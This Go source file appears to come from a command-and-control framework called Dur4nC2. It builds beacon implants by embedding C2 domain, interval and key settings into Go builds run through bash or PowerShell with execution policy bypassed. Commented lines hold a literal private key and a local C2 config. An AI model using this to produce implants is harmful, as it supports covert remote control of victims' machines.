package generate

import (
	_serverCrypto "Dur4nC2/misc/crypto"
	"Dur4nC2/server/db"
	_implantRepository "Dur4nC2/server/domain/implant/respository/postgres"
	"Dur4nC2/server/domain/models"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

const (
	Executeable = "EXECUTABLE"

	Emtpy = "EMPTY"
)

func CreateImplant(config models.ImplantConfig) (string, error) {
	implant_keypair, _ := _implantRepository.NewPosgresImplantRepository(db.Session()).Create()
	server_keypair := _serverCrypto.ECCServerKeyPair()
	/*
		config := &models.ImplantConfig{
			Domain:                  config.Domain,
			URL:                     url,
			PathPrefix:              pathPrefix,
			BeaconInterval:          beaconInterval,
			BeaconJitter:            beaconJitter,
			ECCPublicKey:            implant_keypair.ECCPublicKey,
			ECCPublicKeyDigest:      implant_keypair.ECCPublicKeyDigest,
			ECCPrivateKey:           implant_keypair.ECCPrivateKey,
			ECCPublicKeySignature:   Emtpy,
			MinisignServerPublicKey: Emtpy,
			ECCServerPublicKey:      server_keypair.PublicBase64(),
		}

	*/
	configString := config.Domain + ";" + config.URL + ";" + config.PathPrefix + ";" + strconv.FormatInt(config.BeaconInterval, 10) + ";" + strconv.FormatInt(config.BeaconJitter, 10) + ";" + implant_keypair.ECCPublicKey + ";" + implant_keypair.ECCPublicKeyDigest + ";" + implant_keypair.ECCPrivateKey + ";" + server_keypair.PublicBase64()
	var output string
	switch config.Format {
	case models.OutputFormat_EXECUTABLE:
		executable, err := ImplantExecutable(&config, configString)
		if err != nil {
			return "", err
		}
		output = executable
		//ImplantExecutableJson(*config)
	}
	return output, nil
}
func ImplantExecutable(implantConfig *models.ImplantConfig, configString string) (string, error) {
	var (
		shell string
		cmd   *exec.Cmd
	)
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("powershell", "-ExecutionPolicy", "bypass")
		stdin, err := cmd.StdinPipe()
		if err != nil {
			log.Fatal(err)
		}
		go func() {
			defer stdin.Close()
			//x64 env GOOS=windows GOARCH=amd64
			//x32 GOOS=windows GOARCH=386
			fmt.Fprintln(stdin, `$Env:GOOS = "`+implantConfig.OS+`"`)
			fmt.Fprintln(stdin, `$Env:GOARCH = "amd64"`)
			fmt.Println(configString)
			execStr := `go build -ldflags=' -s -w -X main.configJson=` + configString + `' ` + implantConfig.ImplantPackagePath + `implant.go`
			fmt.Println("asdfasfsfd: ", execStr)
			fmt.Fprintln(stdin, execStr)
		}()
		out, err := cmd.CombinedOutput()
		return string(out), err
	case "linux":
		shell = "bash"
		cmd = exec.Command(shell)
		stdin, err := cmd.StdinPipe()
		if err != nil {
			log.Fatal(err)
		}
		switch implantConfig.OS {
		case "windows":
			go func() {
				defer stdin.Close()
				//x64 env GOOS=windows GOARCH=amd64
				//x32 GOOS=windows GOARCH=386
				execStr := `CGO_ENABLED=1 GOOS=` + implantConfig.OS + ` GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -o /tmp -buildmode=pie -ldflags='-s -w -buildid= -X main.configJson=` + configString + `' ` + implantConfig.ImplantPackagePath + `implant.go`
				fmt.Println(execStr)
				fmt.Fprintln(stdin, execStr)
			}()
			out, err := cmd.CombinedOutput()
			fmt.Println(string(out))
			return string(out), err
			break
		case "linux":
			go func() {
				defer stdin.Close()
				//x64 env GOOS=windows GOARCH=amd64
				//x32 GOOS=windows GOARCH=386
				execStr := `GOOS=` + implantConfig.OS + ` GOARCH=amd64 go build -o /tmp -buildmode=pie -ldflags='-s -w -buildid= -X main.configJson=` + configString + `' ` + implantConfig.ImplantPackagePath + `implant.go`
				fmt.Println(execStr)
				fmt.Fprintln(stdin, execStr)
			}()
			out, err := cmd.CombinedOutput()
			fmt.Println(string(out))
			return string(out), err
			break
		}
		return "", errors.New("unexpected error")
	default:
		return "", errors.New("target os not available")
	}
}
func ImplantExecutableLinux(implantConfig *models.ImplantConfig, configString string) (string, error) {
	cmd := exec.Command("bash")
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Fatal(err)
	}
	go func() {
		defer stdin.Close()
		fmt.Fprintln(stdin, `go build -ldflags='-X main.configJson=`+configString+`' `+implantConfig.ImplantPackagePath+`implant.go`)
	}()
	out, err := cmd.CombinedOutput()
	return string(out), err
}
func ImplantExecutableJson(config models.ImplantConfig) (string, error) {
	var command string
	configJson, err := json.Marshal(config)
	if err != nil {
		return "", err
	}
	temp1 := strings.Trim(string(configJson), " ")
	jsonConfig := strings.Trim(temp1, "\n")
	command = `Invoke-Command -ScriptBlock {go build -ldflags='-X main.configJson="` + jsonConfig + `' C:\Users\Jorge\GolandProjects\Dur4nC2\implant\implant.go}`

	//fmt.Println("Final command:", command)

	// write the whole body at once
	err = os.WriteFile("output.ps1", []byte(command), 0644)
	if err != nil {
		panic(err)
	}
	//err, cmd, errout := gosh.PowershellOutput("powershell.exe -ExecutionPolicy Bypass -File .\\output.ps1")
	//gosh.ShellCommand(`Invoke-Command -ScriptBlock {go build -ldflags='-X main.configJson={"ID":"00000000-0000-0000-0000-000000000000","CreatedAt":"0001-01-01T00:00:00Z","Domain":"127.0.0.1","URL":"http://127.0.0.1:8000","PathPrefix":"","BeaconInterval":5,"BeaconJitter":3,"ECCPublicKey":"qFZnJyh0dSJDevV7rOfztLhZ4NZoA8I67xgxC9OXx0U","ECCPublicKeyDigest":"aNc3HowANiKzmiEetbzmSVEYYKz0xoEjAF8IeYTlFQk","ECCPrivateKey":"g4ASdW993v69XFhfCj9ztSYvbZ60k0JGUsaGlS4ypIw","ECCPublicKeySignature":"","ECCServerPublicKey":"g+BmTwDi/ErTtLDOCFbnuJjveDZOBp4MOFLlO0jMQzY","MinisignServerPublicKey":""}' C:\Users\Jorge\GolandProjects\Dur4nC2\implant\implant.go}`)
	//err, cmd, errout = gosh.PowershellOutput(`go build C:\Users\Jorge\GolandProjects\Dur4nC2\implant\implant.go`)
	//cmd, _ := executions.Command(command).Output()
	//cmd, err := executions.Command("cmd", "/C", "go", "build", "-ldflags='-X main.config="+jsonConfig+"'", "C:\\Users\\Jorge\\GolandProjects\\Dur4nC2\\implant\\implant.go").CombinedOutput()
	cmd := exec.Command("powershell", "-ExecutionPolicy", "bypass")
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Fatal(err)
	}
	go func() {
		defer stdin.Close()
		//fmt.Fprintln(stdin, `.\output.ps1`)
		//fmt.Fprintln(stdin, `go build -ldflags='-X main.configJson={"ID":"00000000-0000-0000-0000-000000000000","CreatedAt":"0001-01-01T00:00:00Z","Domain":"127.0.0.1","URL":"http://127.0.0.1:8000","PathPrefix":"empty","BeaconInterval":"5","BeaconJitter":"3","ECCPublicKey":"qFZnJyh0dSJDevV7rOfztLhZ4NZoA8I67xgxC9OXx0U","ECCPublicKeyDigest":"aNc3HowANiKzmiEetbzmSVEYYKz0xoEjAF8IeYTlFQk","ECCPrivateKey":"g4ASdW993v69XFhfCj9ztSYvbZ60k0JGUsaGlS4ypIw","ECCPublicKeySignature":"empty","ECCServerPublicKey":"g+BmTwDi/ErTtLDOCFbnuJjveDZOBp4MOFLlO0jMQzY","MinisignServerPublicKey":"empty"}' C:\Users\Jorge\GolandProjects\Dur4nC2\implant\implant.go`)
		fmt.Fprintln(stdin, `go build -ldflags='-X main.configJson=`+jsonConfig+`' C:\Users\Jorge\GolandProjects\Dur4nC2\implant\implant.go`)
		//fmt.Fprintln(stdin, `go build -ldflags='-X main.configJson={"ID":"00000000-0000-0000-0000-000000000000","CreatedAt":"0001-01-01T00:00:00Z","Domain":"127.0.0.1","URL":"http://127.0.0.1:8000","PathPrefix":"emtpy"}' C:\Users\Jorge\GolandProjects\Dur4nC2\implant\implant.go`)
		//fmt.Fprintln(stdin, `Get-ExecutionPolicy`)
		//fmt.Fprintln(stdin, `C:\Users\Jorge\GolandProjects\Dur4nC2\server\generate\output.ps1`)
	}()
	out, err := cmd.CombinedOutput()
	fmt.Println("EXEC: ", string(out))
	//fmt.Println("ERROUT: ", errout)
	fmt.Println("ERROROUT: ", err)
	if err != nil {
		fmt.Println("ERROR:", err.Error())
		return "", err
	}
	return string(out), nil
}
